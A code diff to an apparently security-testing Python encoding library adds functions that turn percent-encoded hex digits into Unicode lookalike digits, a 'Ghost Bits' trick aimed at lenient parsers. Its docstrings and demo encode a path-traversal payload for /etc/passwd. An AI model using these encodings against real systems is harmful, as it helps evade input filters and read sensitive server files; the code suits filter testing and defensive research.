@@ -113,6 +113,92 @@ def url_encode_all(input_data: str | bytes, encoding: str = 'utf-8') -> str:
     return ''.join(f'%{b:02x}' for b in bytes_data)
 
 
+UNICODE_DIGIT_HEX_CHARS = (
+    ('０', '੦', '๐', '꘠'),
+    ('１', '੧', '๑', '꘡'),
+    ('２', '੨', '๒', '꘢'),
+    ('３', '੩', '๓', '꘣'),
+    ('４', '੪', '๔', '꘤'),
+    ('５', '੫', '๕', '꘥'),
+    ('６', '੬', '๖', '꘦'),
+    ('７', '੭', '๗', '꘧'),
+    ('８', '੮', '๘', '꘨'),
+    ('９', '੯', '๙', '꘩'),
+    ('ａ', 'Ａ'),
+    ('ｂ', 'Ｂ'),
+    ('ｃ', 'Ｃ'),
+    ('ｄ', 'Ｄ'),
+    ('ｅ', 'Ｅ', 'ₑ'),
+    ('ｆ', 'Ｆ'),
+)
+
+UNICODE_DIGIT_HEX_ESCAPE_RE = re.compile(r'%([0-9a-fA-F]{2})')
+UNICODE_DIGIT_HEX_DEFAULT_SAFE = '/ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_~'
+
+
+def _unicode_digit_hex_char(value: int) -> str:
+    if not 0 <= value <= 0xF:
+        raise ValueError("value 必须在 0x0-0xf 范围内")
+    return random.choice(UNICODE_DIGIT_HEX_CHARS[value])
+
+
+def unicode_digit_hex_escape(data: str) -> str:
+    """
+    将已有百分号编码中的 ASCII hex 位替换成 Unicode digit/hex digit 等价字符。
+
+    这是 Ghost Bits 的 digit 折叠变种之一：部分解析器在解析 hex 文本时会使用类似
+    Character.digit() 的宽松逻辑，可识别 Unicode 数字/字母字符，而不只接受 ASCII 0-9a-fA-F。
+
+    示例：
+        "%2e%2e/etc/passwd" -> "%２ｅ%２ｅ/etc/passwd"
+        "%70%61%73%73%77%64" -> "%７０%６１%７３%７３%７７%６４"
+    """
+    def replace(match: re.Match) -> str:
+        hex_text = match.group(1)
+        return '%' + ''.join(_unicode_digit_hex_char(int(char, 16)) for char in hex_text)
+
+    return UNICODE_DIGIT_HEX_ESCAPE_RE.sub(replace, data)
+
+
+def unicode_digit_hex_encode(
+        data: str | bytes | bytearray | memoryview,
+        encoding: str = 'utf-8',
+        safe: str | bytes = UNICODE_DIGIT_HEX_DEFAULT_SAFE) -> str:
+    """
+    将字符串/字节编码成 Unicode digit/hex digit 风格的百分号编码。
+
+    - str：先按 encoding 编码成 bytes，默认 UTF-8。
+    - bytes/bytearray/memoryview：逐字节处理。
+    - safe：保留不编码的 ASCII 字符，默认保留 /、字母、数字、-、_、~，但不保留 .。
+
+    示例：
+        "../etc/passwd" -> "%２ｅ%２ｅ/etc/passwd"
+        "passwd" 且 safe="" -> "%７０%６１%７３%７３%７７%６４"
+    """
+    if isinstance(data, str):
+        byte_values = data.encode(encoding)
+    elif isinstance(data, (bytes, bytearray, memoryview)):
+        byte_values = bytes(data)
+    else:
+        raise TypeError("data 必须是 str/bytes/bytearray/memoryview")
+
+    safe_bytes = safe.encode('ascii') if isinstance(safe, str) else bytes(safe)
+    safe_set = set(safe_bytes)
+    encoded = []
+
+    for byte_value in byte_values:
+        if byte_value in safe_set:
+            encoded.append(chr(byte_value))
+            continue
+        encoded.append(
+            '%' +
+            _unicode_digit_hex_char(byte_value >> 4) +
+            _unicode_digit_hex_char(byte_value & 0xF)
+        )
+
+    return ''.join(encoded)
+
+
 # url_encode和url_decode是python3的quote和unquote的别名
 url_decode = unquote
 url_encode = quote
@@ -766,6 +852,7 @@ def main():
         ("1.陪sp", "filename suffix"),
     )
 
+    print(ghost_bits_decode("呪乳买"))
     for payload, desc in fixed_cases:
         print(f"{desc}: {payload} -> {ghost_bits_decode(payload)}")
 
@@ -776,6 +863,10 @@ def main():
     print(f"utf-8 bytes: {ghost_bits_decode_to_bytes(utf8_encoded)!r}")
     print(f"utf-8 decode: {ghost_bits_decode(utf8_encoded)}")
 
+    url_payload = "/%2e%2e/etc/%70%61%73%73%77%64"
+    print(f"unicode digit hex escape: {unicode_digit_hex_escape(url_payload)}")
+    print(f"unicode digit hex encode: {unicode_digit_hex_encode('/../etc/passwd')}")
+
 
 __all__ = [
     # --- 函数 ---
@@ -785,6 +876,8 @@ __all__ = [
     'removesuffix',
     'removeprefix',
     'url_encode_all',
+    'unicode_digit_hex_escape',
+    'unicode_digit_hex_encode',
     'url_decode',
     'url_encode',
     'qp_encode_all',
